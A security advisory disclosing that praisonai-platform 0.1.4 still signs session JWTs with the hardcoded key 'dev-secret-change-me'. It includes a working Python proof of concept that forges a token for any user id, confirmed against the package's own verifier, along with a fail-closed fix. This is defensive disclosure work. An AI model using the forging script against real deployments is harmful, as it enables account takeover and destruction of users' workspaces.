# [C] praisonai-platform 0.1.4 still boots on the hardcoded JWT secret dev-secret-change-me (default-open production guard)

## Summary
Severity: Critical
Advisory: GHSA-f38v-77qj-h4jq
CVE: CVE-2026-57148
CWE: CWE-1188, CWE-287, CWE-798
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-18
Source: https://github.com/advisories/GHSA-f38v-77qj-h4jq
Type: github-advisory

## Affected
- PyPI: `praisonai-platform` — affected >=0 <0.1.6

## Details
- Affected: praisonai-platform (PyPI) <= 0.1.4 — including 0.1.4, the version GHSA-3qg8-5g3r-79v5 declares as the patch; main HEAD 8acf77c531e624c46d3d61dcae37e9942e90972c is also affected. File src/praisonai-platform/praisonai_platform/services/auth_service.py

- CWE: CWE-1188 (Insecure Default Initialization) + CWE-798 (Use of Hard-coded Credentials) -> CWE-287 (Improper Authentication)

## Overview

GHSA-3qg8-5g3r-79v5 (Critical) reported that praisonai-platform's JWT signing secret defaulted to the hardcoded literal "dev-secret-change-me", and that the production guard meant to prevent this was default-open (it only fired when PLATFORM_ENV != "dev", but PLATFORM_ENV defaults to "dev"). That advisory declares the issue patched in >= 0.1.4. **It is not.** The shipped praisonai-platform==0.1.4 (and current main) still resolves the signing key to "dev-secret-change-me" in any deployment that does not explicitly set PLATFORM_JWT_SECRET, because the 0.1.4 change merely duplicated the same default-open guard into a second function instead of failing closed. An unauthenticated attacker reads the literal from the public source, forges a JWT with an arbitrary sub, and is authenticated as that user — including a workspace owner.

## Impact

Any deployment that runs praisonai-platform 0.1.4 without explicitly exporting a strong PLATFORM_JWT_SECRET signs and verifies session JWTs with the publicly known key "dev-secret-change-me". The package's documented entry point — `python -m praisonai_platform --host 0.0.0.0 --port 8000` (equivalently `uvicorn praisonai_platform.api.app:app --host 0.0.0.0`) — sets neither PLATFORM_JWT_SECRET nor PLATFORM_ENV, so this is the default state, not an edge case. A repository-wide search finds both variables only at the two guard sites and in test fixtures; no shipped Dockerfile, compose file, or deployment doc sets either.

Consequences:

- **Complete authentication bypass (unauthenticated).** Knowing only the public default secret read from source, an attacker mints HS256({"sub": <user id>, "email": …, "exp": <future>}, "dev-secret-change-me"). The platform's own verifier accepts it and returns an authenticated identity for the attacker-chosen sub — no account and no prior access required. This is the headline defect: the identical break GHSA-3qg8 was scored 9.8 for.

- **Workspace-owner takeover (when a target owner's id is known).** Forging the sub of a workspace owner satisfies require_workspace_member / require_workspace_owner and the owner-gated routes, yielding owner-level read/update/delete of every resource in that workspace plus member/role management. uuid4 user ids are unguessable, so impersonating a specific owner additionally requires learning that owner's id — which any co-member can read directly from GET /{workspace_id}/members (returns List[MemberResponse], each carrying user_id and role, to any holder of require_workspace_member), and which also surfaces in logs and referrals. The end state matches the three Critical advisories of the 0.1.4 wave (this one, plus GHSA-c2m8-4gcg-v22g 9.6 and GHSA-h8q5-cp56-rr65).

- **Resource destruction / lock-out (A:H).** Owner impersonation reaches DELETE /workspaces/{workspace_id} (gated by require_workspace_owner), which deletes the entire workspace and every contained resource, and DELETE /{workspace_id}/members/{user_id}, which evicts legitimate members — irrecoverable denial of the workspace to its rightful users.

- **Affected population:** every default (no PLATFORM_JWT_SECRET) deployment of 0.1.4 — the version users upgrade to specifically because GHSA-3qg8 told them 0.1.4 is fixed.

PR:N / AC:L apply to the authentication-bypass primitive: minting a valid session for a known sub needs no account, only the public secret. Targeted takeover of a specific owner additionally requires that owner's user id (readable by any co-member from the member-list response above, or recoverable from logs / prior exposure); this conditions the highest-impact path but not the bypass itself. The vector matches the PR:N/9.8 GitHub assigned the original GHSA-3qg8 for the identical defect.

## Technical Details

All references are to src/praisonai-platform/praisonai_platform/... in praisonai-platform==0.1.4 (PyPI sdist) and main HEAD 8acf77c. The two copies of services/auth_service.py are byte-identical — sha256 = cc29d43c5412da2c73c818859b8d8b146587842999b777336017ab9d9e509258 for both the shipped 0.1.4 sdist and the HEAD checkout — so the patched release and current main carry the same defect verbatim.

**1. Module-load guard is default-open (services/auth_service.py:25-34).**

```python
DEFAULT_SECRET = "dev-secret-change-me"
JWT_SECRET = os.environ.get("PLATFORM_JWT_SECRET", DEFAULT_SECRET)
JWT_ALGORITHM = "HS256"
JWT_TTL_SECONDS = int(os.environ.get("PLATFORM_JWT_TTL", str(30 * 24 * 3600)))
if JWT_SECRET == DEFAULT_SECRET and os.environ.get("PLATFORM_ENV", "dev") != "dev":
    raise RuntimeError(
        "PLATFORM_JWT_SECRET must be set to a strong random value in production. "
        "Set PLATFORM_ENV=dev to suppress this check during development."
    )
```

The raise fires only when PLATFORM_ENV != "dev". But os.environ.get("PLATFORM_ENV", "dev") defaults to "dev", and PLATFORM_ENV is set nowhere in the package or its deployment configuration (a repo-wide search finds PLATFORM_ENV only at these two guard sites, and PLATFORM_JWT_SECRET only here plus in tests/ fixtures that set it explicitly — no Dockerfile, compose file, or doc sets either). So in a clean deployment the predicate is True and ("dev" != "dev") = False; the guard does not fire and JWT_SECRET stays "dev-secret-change-me".

**2. The 0.1.4 "fix" duplicated the same default-open guard (services/auth_service.py:114-128).** Instead of failing closed, 0.1.4 added the identical predicate to _issue_token:

```python
def _issue_token(self, user: User) -> str:
    if JWT_SECRET == DEFAULT_SECRET and os.environ.get("PLATFORM_ENV", "dev") != "dev":
        raise RuntimeError("Refusing to issue JWT with default PLATFORM_JWT_SECRET outside dev")
    ...
    return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGORITHM)   # signs with the default secret
```

GHSA-3qg8 states the intended fix is to "fail-closed at import time when the secret is the default, regardless of any environment variable." HEAD does not do that; both guard copies remain gated on the PLATFORM_ENV != "dev" condition that is false by default. The advisory's own patch threshold (>= 0.1.4) is therefore incorrect — 0.1.4 is still vulnerable.

**3. Verification trusts the forged sub end-to-end (services/auth_service.py:131-141 -> api/deps.py:28-73).**

```python
def _verify_token(self, token):
    payload = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGORITHM])   # default secret; alg pinned; exp checked
    return AuthIdentity(id=payload["sub"], type="user", email=payload.get("email"), name=payload.get("name"))
```

get_current_user (deps.py:28) returns this identity directly; require_workspace_member (deps.py:54) authorizes purely from member_svc.has_role(workspace_id, identity.id, min_role) against the forged sub. Decoding is otherwise sound (HS256 pinned, exp enforced by PyJWT, no verify=False), so the only break is the default secret. No middleware or app-factory check re-validates (api/app.py mounts the routers with per-route Depends(get_current_user) and no global re-root).

The cross-workspace IDOR (GHSA-h8q5-cp56-rr65) and member-role privilege-escalation (GHSA-c2m8-4gcg-v22g) fixes were reviewed at HEAD and appear complete; this advisory is specific to the JWT-secret guard.

## Reproduction

praisonai-platform is a Python server package, so the PoC is a self-contained Python reproducer that installs the shipped 0.1.4 release, simulates a default deployment (no env vars), forges a token with the public default secret, and feeds it to the package's own AuthService._verify_token.

```bash
mkdir poc && cd poc
pip install --target ./pkgs praisonai-platform==0.1.4 PyJWT
python3 poc.py
```

```python
# poc.py
import os, sys
os.environ.pop("PLATFORM_JWT_SECRET", None)   # default deployment: secret not set
os.environ.pop("PLATFORM_ENV", None)          # default deployment: env not set -> guard default-open
sys.path.insert(0, "./pkgs")

from datetime import datetime, timedelta, timezone
import jwt

VICTIM_SUB = "11111111-2222-4333-8444-deadbeefcafe"   # a target user/owner uuid4
now = datetime.now(timezone.utc)
forged = jwt.encode(
    {"sub": VICTIM_SUB, "email": "victim@target", "name": "victim",
     "iat": now, "exp": now + timedelta(hours=1)},
    "dev-secret-change-me", algorithm="HS256",       # the public hardcoded default
)

from praisonai_platform.services import auth_service as A
print("package JWT_SECRET (env unset) =", repr(A.JWT_SECRET), "| == default?", A.JWT_SECRET == "dev-secret-change-me")
identity = A.AuthService.__new__(A.AuthService)._verify_token(forged)   # the package's own verifier
print("package _verify_token(forged) =", identity)
assert identity is not None and identity.id == VICTIM_SUB
print("RESULT: CONFIRMED — forged token accepted as victim")
```

### End-to-end (runtime) verification

Observed output, run against the actually-installed praisonai-platform==0.1.4 (the GHSA-3qg8 "patched" release):

```text
package JWT_SECRET (env unset) = 'dev-secret-change-me' | == default? True
package _verify_token(forged) = AuthIdentity(id='11111111-2222-4333-8444-deadbeefcafe', type='user', workspace_id=None, roles=[], email='victim@target', name='victim', metadata={})
RESULT: CONFIRMED — forged token accepted as victim
```

This is the package's own _verify_token (not a re-implementation) returning an authenticated AuthIdentity for an attacker-chosen sub, proving end-to-end that 0.1.4 accepts forged sessions in a default deployment. The intermediate observation (the module-level JWT_SECRET equals the public default) and the final sink (the verifier returns the victim identity) were both observed at runtime.

### Default-open contrast

Setting only PLATFORM_ENV (still no PLATFORM_JWT_SECRET) makes the same guard fire at import — demonstrating that the only thing protecting a production deployment is an environment variable that defaults to the unsafe value:

```bash
PLATFORM_ENV=prod python3 -c "import praisonai_platform.services.auth_service"
```

```text
  File ".../praisonai_platform/services/auth_service.py", line 31, in <module>
    raise RuntimeError(
RuntimeError: PLATFORM_JWT_SECRET must be set to a strong random value in production. Set PLATFORM_ENV=dev to suppress this check during development.
```

The guard can fail closed — it simply does not in the default (PLATFORM_ENV unset → "dev") state, which is exactly what GHSA-3qg8 reported and 0.1.4 left unchanged.

## Suggested Fix

Fail closed, independent of PLATFORM_ENV:

```python
JWT_SECRET = os.environ.get("PLATFORM_JWT_SECRET")
if not JWT_SECRET:
    raise RuntimeError("PLATFORM_JWT_SECRET must be set to a strong random value; refusing to start with a default key.")
if JWT_SECRET == "dev-secret-change-me":
    raise RuntimeError("PLATFORM_JWT_SECRET is the well-known default; set a unique strong value.")
```

- Remove the _DEFAULT_SECRET fallback entirely (no default signing key), or at minimum raise unconditionally when the secret is the default — do **not** gate that check on PLATFORM_ENV, whose default value ("dev") is precisely what disables the check.

- Apply the same to the duplicated guard in _issue_token.

- Consider generating a random per-process secret only for an explicit, clearly-flagged dev mode (e.g. PLATFORM_ENV=dev opt-in), so the safe default is fail-closed.

## Disclosure Timeline

- 2026-05-30: Discovered as an incomplete fix of GHSA-3qg8-5g3r-79v5 while auditing praisonai-platform at main HEAD 8acf77c. Runtime-confirmed against the shipped PyPI release praisonai-platform==0.1.4: a token forged with the public default secret is accepted by the package's own AuthService._verify_token.

- 2026-05-30: Drafted for submission via GitHub Security Advisory (PraisonAI).

## References

- Original advisory (declares 0.1.4 patched): GHSA-3qg8-5g3r-79v5 — "praisonai-platform: JWT signing key defaults to hardcoded dev-secret-change-me … when PLATFORM_ENV is unset" (Critical, 9.8).

- Affected source: src/praisonai-platform/praisonai_platform/services/auth_service.py:25-34 (module guard), :114-128 (_issue_token duplicate guard + sign), :130-141 (_verify_token); api/deps.py:28-73 (get_current_user, require_workspace_member); api/app.py (router mounting, no global auth re-root).

- Shipped artifact verified: praisonai-platform==0.1.4 PyPI sdist (pyproject.toml:7 version = "0.1.4"); auth_service.py is byte-identical to main HEAD 8acf77c531e624c46d3d61dcae37e9942e90972c (sha256 cc29d43c5412da2c73c818859b8d8b146587842999b777336017ab9d9e509258).

- Sibling advisories from the same 0.1.4 wave (reviewed, fixes appear complete at HEAD): the wave closed three Critical advisories in total — this one (GHSA-3qg8-5g3r-79v5, 9.8) plus GHSA-c2m8-4gcg-v22g (member-role privilege escalation, 9.6) and GHSA-h8q5-cp56-rr65 (cross-workspace IDOR + role escalation) — alongside several High/Medium IDOR advisories.

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-f38v-77qj-h4jq
- https://github.com/MervinPraison/PraisonAI
